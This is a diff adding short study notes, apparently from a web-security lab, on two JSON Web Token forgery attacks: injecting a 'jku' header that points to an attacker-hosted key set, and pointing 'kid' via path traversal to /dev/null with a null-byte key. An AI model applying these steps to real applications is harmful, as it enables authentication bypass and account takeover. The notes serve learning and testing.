@@ -1,0 +1,35 @@
+# JKU ATTACK
+> Host the following on an exploit server:
+{
+    "keys": [
+
+    ]
+}
+
+> Go to JWT extensions and generate RSA key pair
+> Click on RSA pair and select 'Copy Public Key as JWK'
+
+> Copy into keys on exploit server like so
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "0baff30d-4110-4965-b5ad-e5440ba9847c",
+            "n": "7xS3mzj_dptGm-wEkyoD17Aq4FAAQvvqTuSV2lZzu0r6N78UFXGnJG3fHY_DaQlb04gy2uaCu0fylGp8yhP1U4UUDQOecW_UpUxzheUYJGyR_3mTPH6WnSpWJe4eji4h0UxLXigrxdU8ctEZGZIVbwUK2HQXT-0tENbvrH2p3OriD9WdjYPq6HWXhBm1a1DOhfEHX_uMW-b83cjPWzypwRV3Gk0g2SJJDwb0Hcfz3VUyG0dppGw8PcCQT79rc7qhNnLUk53YTKt4tWd4DuN_xx3NCbRmqJIXp8VZF6OujLWwe2cNHQ8dJdmNx787IW8qld8yUtXnXgPk-pTgdb0BWw"
+        }
+    ]
+}
+
+> Insert jku into header like so:
+"jku": "https://exploit-0adf00cc03ea5020c136bb7e01da001b.exploit-server.net/exploit"
+
+> Make your amends in the payload
+> Sign with key
+
+# POINT KID TO /DEV/NULL
+> generate symmetric key
+> replace k with AA== (null byte base64)
+> change kid to: ../../../../../../../dev/null 
+> change payload to whatever
+> sign (don't change headers)
